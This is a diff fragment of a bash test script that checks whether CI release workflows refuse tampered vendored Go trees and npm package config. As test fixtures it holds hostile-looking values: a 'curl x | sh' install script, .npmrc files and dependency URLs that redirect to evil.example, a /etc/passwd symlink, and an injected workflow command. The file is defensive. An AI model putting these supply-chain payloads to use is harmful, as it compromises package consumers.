+	copy_case 'a LICENSE_windows_amd64.syso is refused (#1049 review)' refused 'printf x >webview_go/LICENSE_windows_amd64.syso' 'holds LICENSE_windows_amd64.syso'
+	copy_case 'a LICENSE_test.go is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/LICENSE_test.go' 'holds LICENSE_test.go'
+	copy_case 'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso' 'holds libs/webview/evil_windows_amd64.syso'
+	copy_case 'assembly under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil.S' 'holds libs/webview/evil.S'
+	copy_case 'a test file under libs is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/libs/webview/x_test.go' 'a test file'
+	copy_case 'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes' 'changes .gitattributes'
+	copy_case 'a changed jarvis.patch is refused (#1049 review)' refused 'printf "\n" >>webview_go/jarvis.patch' 'changes jarvis.patch'
+	copy_case 'a changed JARVIS_PATCH.md is refused (#1049 review)' refused 'printf "\n" >>webview_go/JARVIS_PATCH.md' 'changes JARVIS_PATCH.md'
+	copy_case 'a .gitattributes under libs is refused (#1049 review)' refused 'printf "* -diff\n" >webview_go/libs/.gitattributes'
+	copy_case 'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h' 'a .git file below its top'
+	copy_case 'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum' 'go.sum differs'
+	copy_case 'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done' '50 directories'
+	copy_case 'a CRLF go.mod is refused (#1049 review)' refused 'sed -i "s/\$/\r/" go.mod' 'sidecar/go.mod differs'
+	copy_case 'require( with no space is refused (#1049 review)' refused 'sed -i "s/^require (/require(/" go.mod' 'sidecar/go.mod differs'
+	copy_case 'a quoted module path is refused (#1049 review)' refused 'sed -i "s|github.com/google/uuid|\"github.com/google/uuid\"|" go.mod' 'sidecar/go.mod differs'
+	copy_case 'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
+	copy_case 'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
+	copy_case 'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
+	copy_case 'a 7 MiB header is accepted (#1049)' ok 'head -c 7340032 /dev/zero >webview_go/libs/big.h'
 	# copy_mutant <label> <exact text> <replacement> <copy_case arguments...>
 	copy_mutant() {
 		local label="$1" old="$2" new="$3"
@@ -3770,20 +4025,310 @@ else
 			'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
 		copy_mutant 'the webview copy taking a .git (#983)' \
 			'-iname .git -print -quit' '-iname .nothing -print -quit' \
-			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit'
+			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit' 'holds a .git'
 		copy_mutant 'the webview copy taking any shape of artifact (#983)' \
 			'if [ "$(find "$in" -mindepth 1 -maxdepth 1 | wc -l)" != 3 ] || [ ! -f "$in/go.mod" ] || [ ! -f "$in/go.sum" ] || [ ! -d "$in/webview_go" ]; then' 'if false; then' \
 			'an extra file beside the tree is refused' refused 'printf x >evil.sh'
 		copy_mutant 'the webview copy matching .git in one case only (review of #983)' \
 			'-iname .git -print -quit' '-name .git -print -quit' \
-			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout'
+			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout' 'holds a .git'
 		copy_mutant 'the webview copy taking any name (review of #983)' \
 			"-name '*[!A-Za-z0-9._+-]*' -print -quit" '-false -print -quit' \
 			'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
+		copy_mutant 'the webview copy with no size cap (#1049)' \
+			'[ "$bytes" -gt 8388608 ]' '[ "$bytes" -gt 999999999999 ]' \
+			'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
+		copy_mutant 'the webview copy with no file count cap (#1049)' \
+			'[ "$files" -gt 100 ]' '[ "$files" -gt 100000 ]' \
+			'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
+		copy_mutant 'the webview copy taking any top-level file (#1049)' \
+			'*) echo "::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)"; exit 1 ;;' '*) ;;' \
+			'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
+		copy_mutant 'the webview copy taking a top-level test file (#1049)' \
+			'"f "*_test.go) echo' '"f "*_nothing.go) echo' \
+			'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
+		copy_mutant 'the webview copy not comparing sidecar/go.mod (#1049)' \
+			'new_mod="$(directives "$in/go.mod")"' 'new_mod="$main_mod"' \
+			'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
+		copy_mutant 'the webview copy blind to block entries (#1049)' \
+			'block != "" { print block " " $0; next }' 'block != "" { next }' \
+			'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
+		copy_mutant 'the webview copy reading a block entry without its keyword (#1049)' \
+			'block != "" { print block " " $0; next }' 'block != "" { print; next }' \
+			'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
+		copy_mutant 'the webview copy not comparing the vendored go.mod (#1049)' \
+			'new_mod="$(directives "$in/webview_go/go.mod" | awk' 'new_mod="$(directives sidecar/third_party/webview_go/go.mod | awk' \
+			'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
+		copy_mutant 'LICENSE matched as a prefix again (#1049 review)' \
+			'| "f LICENSE") ;;' '| "f LICENSE"*) ;;' \
+			'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso'
+		copy_mutant 'libs taking any file (#1049 review)' \
+			'libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;' 'libs/*) ;;' \
+			'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso'
+		copy_mutant 'the kept files taken as the artifact has them (#1049 review)' \
+			'for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do' 'for f in; do' \
+			'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes'
+		copy_mutant 'a .git name below the top let through (#1049 review)' \
+			"-mindepth 2 -iname '.git*' -print -quit" '-false -print -quit' \
+			'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h'
+		copy_mutant 'go.sum taken as the artifact has it (#1049 review)' \
+			'if ! cmp -s "$in/go.sum" sidecar/go.sum; then' 'if false; then' \
+			'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum'
+		copy_mutant 'no directory cap (#1049 review)' \
+			'[ "$dirs" -gt 50 ]' '[ "$dirs" -gt 50000 ]' \
+			'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done'
+		copy_mutant 'the go.mod difference printed raw (#1049 review)' \
+			'| cat -v || true' '|| true' \
+			'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
+		copy_mutant 'go.mod comments kept, so a tidy comment reads as a change (#1049 review)' \
+			'{ sub(/\/\/.*/, "") }' '{ }' \
+			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
+		copy_mutant 'go.mod spacing kept, so reformatting reads as a change (#1049 review)' \
+			'{ $1 = $1 }' '{ }' \
+			'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
 		copy_mutant 'the webview copy taking a tree of another version (review of #983)' \
 			'!= "$VERSION" ]; then' '= x ]; then' \
 			'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
 	}
+fi
+
+echo
+echo "publish-sidecar refuses npm config and package fields that change what npm runs (#1046)"
+# npm reads a .npmrc in the directory it runs from, and acts on package.json
+# fields such as scripts and publishConfig; the job holding id-token checks
+# its checkout for both before any npm command. The step, executed verbatim
+# against a copy of sidecar/npm, then against hostile copies of it.
+NPMRC_STEP_NAME="Refuse npm config and package fields that change what npm runs"
+NPMRC_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" NAME="$NPMRC_STEP_NAME" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === process.env.NAME);
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || NPMRC_STEP=""
+# npmrc_case <label> <ok|refused> <shell run in the fixture checkout to shape it>
+npmrc_case() {
+	local d="${WORK}/npmrc" rc=0 ok_=0
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
+		no "npm content: $1 (the fixture could not be made)"
+		return
+	}
+	(cd "$d/ws" && eval "$3") || {
+		no "npm content: $1 (the fixture could not be shaped)"
+		return
+	}
+	(cd "$d/ws" && env -i PATH="$PATH" bash -e -c "${NPMRC_STEP_UNDER_TEST:-$NPMRC_STEP}") >"$d/log" 2>&1 || rc=$?
+	case "$2" in
+	ok) [ "$rc" -eq 0 ] && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "npm content: $1"; else no "npm content: $1" "exit ${rc}; log: $(cat "$d/log")"; fi
+}
+# npmrc_field <package dir> <jq filter>: rewrite one fixture package.json.
+npmrc_field() { jq "$2" "sidecar/npm/$1/package.json" >pj.tmp && mv pj.tmp "sidecar/npm/$1/package.json"; }
+if [ -z "$NPMRC_STEP" ]; then
+	no "found sidecar-release.yml publish-sidecar: ${NPMRC_STEP_NAME}"
+else
+	npmrc_case 'the six packages as committed pass' ok ':'
+	npmrc_case 'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
+	npmrc_case 'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
+	npmrc_case 'an empty scripts object is refused' refused 'npmrc_field win32-x64 ".scripts = {}"'
+	npmrc_case 'a publishConfig that redirects the publish is refused' refused 'npmrc_field darwin-arm64 ".publishConfig = {registry: \"https://evil.example/\"}"'
+	npmrc_case 'a package.json that is not an object is refused' refused 'printf "[]\n" >sidecar/npm/darwin-x64/package.json'
+	npmrc_case 'a package.json that is not JSON is refused' refused 'printf "{\n" >sidecar/npm/linux-arm64/package.json'
+	npmrc_case 'a missing package.json is refused' refused 'rm sidecar/npm/linux-arm64/package.json'
+	npmrc_case 'a .npmrc beside a package is refused' refused 'printf "registry=https://evil.example/\n" >sidecar/npm/linux-x64/.npmrc'
+	npmrc_case 'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
+	npmrc_case 'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
+	npmrc_case 'a .npmrc that is a directory is refused' refused 'mkdir sidecar/npm/win32-x64/.npmrc'
+	# Security review of #1046: links, extra files, and the values.
+	npmrc_case 'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
+	npmrc_case 'a package.json that is a link to a benign file is refused' refused 'mkdir sidecar/npm/linux-x64/bin && mv sidecar/npm/linux-x64/package.json sidecar/npm/linux-x64/bin/p.json && ln -s bin/p.json sidecar/npm/linux-x64/package.json'
+	npmrc_case 'sidecar/npm as a link is refused' refused 'mv sidecar/npm sidecar/real && ln -s real sidecar/npm'
+	npmrc_case 'an extra file in a package is refused' refused 'printf x >sidecar/npm/win32-x64/README.md'
+	npmrc_case 'a package.json above the packages is refused' refused 'printf "{\"workspaces\": [\"*\"]}\n" >sidecar/npm/package.json'
+	npmrc_case 'a platform package renamed to the wrapper is refused' refused 'npmrc_field linux-x64 ".name = \"@usejarvis/sidecar\""'
+	npmrc_case 'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
+	npmrc_case 'the wrapper renamed is refused' refused 'npmrc_field jarvis-sidecar ".name = \"@usejarvis/brain\""'
+	npmrc_case 'a platform package shipping more than bin is refused' refused 'npmrc_field linux-arm64 ".files = [\"bin\", \"lib\"]"'
+	npmrc_case 'a platform package with a bin field is refused' refused 'npmrc_field win32-x64 ".bin = {\"x\": \"bin/x\"}"'
+	npmrc_case 'the wrapper launching another file is refused' refused 'npmrc_field jarvis-sidecar ".bin = {\"jarvis\": \"bin/other\"}"'
+	npmrc_case 'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
+	npmrc_case 'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
+	# npmrc_mutant <label> <exact text> <replacement> <npmrc_case arguments...>
+	npmrc_mutant() {
+		local label="$1" old="$2" new="$3" mutated res
+		shift 3
+		mutated="$(OLD="$old" NEW="$new" SRC="$NPMRC_STEP" bun -e 'const s = process.env.SRC; if (!s.includes(process.env.OLD)) process.exit(2); process.stdout.write(s.replace(process.env.OLD, () => process.env.NEW));')" || {
+			no "npm content mutant '${label}' could be applied (the step no longer has the text it mutates)"
+			return
+		}
+		res="$(NPMRC_STEP_UNDER_TEST="$mutated" npmrc_case "$@")"
+		if grep -q "^  FAIL" <<<"$res"; then ok "reports: ${label}"; else no "reports: ${label}" "the case passed a step with this hole"; fi
+	}
+	# shellcheck disable=SC2016 # literal workflow text, not shell.
+	{
+		npmrc_mutant 'the .npmrc search dropped (#1046)' \
+			'find . -name .npmrc -print -quit' 'true' \
+			'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
+		npmrc_mutant 'the .npmrc search held to sidecar/npm, missing one at the root (#1046)' \
+			'find . -name .npmrc -print -quit' 'find sidecar/npm -name .npmrc -print -quit' \
+			'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
+		npmrc_mutant 'scripts allowed back into the package fields (#1046)' \
+			'"repository", "version"]' '"repository", "scripts", "version"]' \
+			'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
+		npmrc_mutant 'the wrapper package left out of the field check (#1046)' \
+			'.name == "@usejarvis/sidecar" and' 'true or' \
+			'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
+		npmrc_mutant 'the tree check dropped, links let through (#1046 review)' \
+			'if [ "$tree" != ' 'if false && [ "$tree" != ' \
+			'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
+		npmrc_mutant 'the platform name left unchecked (#1046 review)' \
+			'.name == $name and' '' \
+			'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
+		npmrc_mutant 'the wrapper dependency values left unchecked (#1046 review)' \
+			'all(.[]; type == "string" and test(' 'all(.[]; type == "string" or test(' \
+			'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
+		npmrc_mutant 'the wrapper dependencies left unchecked (#1046 review)' \
+			'(.optionalDependencies | type == "object" and keys == [' '(true or keys == [' \
+			'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
+	}
+fi
+# The step fails the release on a .npmrc anywhere in the checkout; this
+# fails the PR that adds one first. node_modules, .git and .claude are not
+# in a checkout.
+# npmrc_tree <dir>: every .npmrc under it, one per line.
+npmrc_tree() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	DIR="$1" bun -e '
+const fs = require("node:fs");
+const skip = new Set(["node_modules", ".git", ".claude"]);
+const walk = (d, rel) => {
+  for (const e of fs.readdirSync(d, { withFileTypes: true })) {
+    if (e.name === ".npmrc") console.log(rel + e.name);
+    if (e.isDirectory() && !skip.has(e.name)) walk(d + "/" + e.name, rel + e.name + "/");
+  }
+};
+walk(process.env.DIR, "");
+'
+}
+found="$(npmrc_tree "${HERE}/../..")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "no .npmrc in the repository, which publish-sidecar would refuse (#1046)"; else no "no .npmrc in the repository, which publish-sidecar would refuse (#1046)" "$found"; fi
+rm -rf "${WORK}/npmrctree" && mkdir -p "${WORK}/npmrctree/a/b" && printf 'x=1\n' >"${WORK}/npmrctree/a/b/.npmrc"
+if [ "$(npmrc_tree "${WORK}/npmrctree")" = "a/b/.npmrc" ]; then ok "reports: a .npmrc deep in the tree (#1046)"; else no "reports: a .npmrc deep in the tree (#1046)"; fi
+# ...and again where npm runs (security review of #1046): Prepare platform
+# packages, executed verbatim with an npm that only logs, against artifacts
+# shaped as a build job could shape them and a checkout whose bin/ is a link.
+PREP_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === "Prepare platform packages");
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || PREP_STEP=""
+# prep_case <label> <ok|refused> <shell run in the workspace to shape it>
+prep_case() {
+	local d="${WORK}/prep" rc=0 ok_=0 p
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar" "$d/bin" "$d/app/Jarvis.app/Contents/MacOS" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
+		no "npm content at Prepare: $1 (the fixture could not be made)"
+		return
+	}
+	printf '#!/usr/bin/env bash\nprintf "%%s %%s\\n" "$(basename "$PWD")" "$*" >>"%s/npm.log"\n' "$d" >"$d/bin/npm" && chmod +x "$d/bin/npm"
+	printf 'app\n' >"$d/app/Jarvis.app/Contents/MacOS/jarvis"
+	for p in linux-x64 linux-arm64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && printf 'elf\n' >"$d/ws/artifacts/sidecar-$p/jarvis"; done
+	mkdir -p "$d/ws/artifacts/sidecar-win32-x64" && printf 'pe\n' >"$d/ws/artifacts/sidecar-win32-x64/jarvis.exe"
+	for p in darwin-arm64 darwin-x64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && tar -czf "$d/ws/artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$d/app" Jarvis.app; done
+	(cd "$d/ws" && D="$d" eval "$3") || {
+		no "npm content at Prepare: $1 (the fixture could not be shaped)"
+		return
+	}
+	: >"$d/npm.log"
+	(cd "$d/ws" && env -i PATH="$d/bin:$PATH" GITHUB_WORKSPACE="$d/ws" VERSION=1.2.3 bash -e -c "${PREP_STEP_UNDER_TEST:-$PREP_STEP}") >"$d/log" 2>&1 || rc=$?
+	case "$2" in
+	ok) [ "$rc" -eq 0 ] && [ "$(grep -c ' version 1.2.3 ' "$d/npm.log")" = 6 ] && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ! grep -q '^darwin-arm64 ' "$d/npm.log" && ok_=1 ;;
+	refused-wrapper) [ "$rc" -ne 0 ] && grep -q '^::error::the wrapper does not depend on all five' "$d/log" && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "npm content at Prepare: $1"; else no "npm content at Prepare: $1" "exit ${rc}; log: $(cat "$d/log"); npm: $(cat "$d/npm.log")"; fi
+}
+# The app tarball with a .npmrc at its top, beside Jarvis.app.
+PREP_EVIL='printf "registry=https://evil.example/\n" >"$D/app/.npmrc" && for p in darwin-arm64; do tar -czf "artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$D/app" Jarvis.app .npmrc; done'
+if [ -z "$PREP_STEP" ]; then
+	no "found sidecar-release.yml publish-sidecar: Prepare platform packages"
+else
+	prep_case 'the six packages version with their artifacts in' ok ':'
+	prep_case 'an app tarball unpacked into bin/ with a .npmrc in it is fine' ok "$PREP_EVIL"
+	prep_case 'a bin link to its package, through which the tarball lands a .npmrc beside npm, is refused' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL"
+	# The wrapper rewrite read back (round 2 review of #1046): sed edits
+	# lines. npm 12.1.0 puts a value back on its key line first (measured),
+	# and the npm here only logs, so this stands for an npm that does not.
+	PREP_SPLIT='sed -i "s|\"@usejarvis/sidecar-linux-x64\": \"0.1.0\"|\"@usejarvis/sidecar-linux-x64\":\n      \"0.1.0\"|" sidecar/npm/jarvis-sidecar/package.json && jq -e . sidecar/npm/jarvis-sidecar/package.json >/dev/null && grep -qx "      \"0.1.0\"," sidecar/npm/jarvis-sidecar/package.json'
+	prep_case 'a wrapper dependency the line-based rewrite misses is refused' refused-wrapper "$PREP_SPLIT"
+	# The field check again where npm runs (review of the branch): a
+	# package.json that differs from what the checkout check passed, here
+	# one carrying a script, stops Prepare before its npm version.
+	PREP_SCRIPT='jq ".scripts = {version: \"id\"}" sidecar/npm/darwin-arm64/package.json >pj.tmp && mv pj.tmp sidecar/npm/darwin-arm64/package.json'
+	prep_case 'a platform package.json that changed after the checkout check is refused before npm runs there' refused "$PREP_SCRIPT"
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL")"; then
+		ok "reports: Prepare no longer checking the package directory before npm (#1046 review)"
+	else
+		no "reports: Prepare no longer checking the package directory before npm (#1046 review)" "the case passed a step with this hole"
+	fi
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg name"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg name"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare field re-check mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "$PREP_SCRIPT")"; then
+		ok "reports: Prepare no longer checking package.json fields before npm (review of #1046)"
+	else
+		no "reports: Prepare no longer checking package.json fields before npm (review of #1046)" "the case passed a step with this hole"
+	fi
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg v"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg v"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare read-back mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused-wrapper "$PREP_SPLIT")"; then
+		ok "reports: the wrapper rewrite no longer read back (#1046 review)"
+	else
+		no "reports: the wrapper rewrite no longer read back (#1046 review)" "the case passed a step with this hole"
+	fi
+fi
+# ...and before the first step that runs npm, or sets it up.
+npmrc_order() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	FILE="$1" NAME="$NPMRC_STEP_NAME" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const steps = d.jobs?.["publish-sidecar"]?.steps ?? [];
+const at = steps.findIndex((s) => s.name === process.env.NAME);
+const first = steps.findIndex((s) => /\bnpm\b/.test(String(s.run ?? "")) || String(s.uses ?? "").toLowerCase().startsWith("actions/setup-node@"));
+if (at < 0) console.log("publish-sidecar has no step " + process.env.NAME);
+else if (first >= 0 && first < at) console.log("publish-sidecar sets up or runs npm in step " + first + " (" + (steps[first].name ?? steps[first].uses) + "), before " + process.env.NAME);
+'
+}
+found="$(npmrc_order "$WORKFLOWS/sidecar-release.yml")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)"; else no "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)" "$found"; fi
+copy="${WORK}/npmrc-order.yml"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" NAME="$NPMRC_STEP_NAME" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const m = new RegExp("      - name: " + process.env.NAME + "\\n        run: \\|\\n(?:          .*\\n|\\n)*?\\n").exec(s);
+const anchor = "      - name: Ensure npm supports Trusted Publishing\n";
+if (!m || !s.includes(anchor)) process.exit(2);
+const t = s.replace(m[0], "");
+await Bun.write(process.env.TO, t.replace(anchor, () => m[0] + anchor));
+' && grep -qF 'sets up or runs npm in step' <<<"$(npmrc_order "$copy")"; then
+	ok "reports: the npm content check moved after setup-node (#1046)"
+else
+	no "reports: the npm content check moved after setup-node (#1046)"
+fi
+if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const old = "      - name: Refuse npm config and package fields that change what npm runs\n";
+if (!s.includes(old)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(old, () => "      - name: Something else\n"));
+' && grep -qF 'has no step' <<<"$(npmrc_order "$copy")"; then
+	ok "reports: the npm content check gone from publish-sidecar (#1046)"
+else
+	no "reports: the npm content check gone from publish-sidecar (#1046)"
 fi
 
 echo
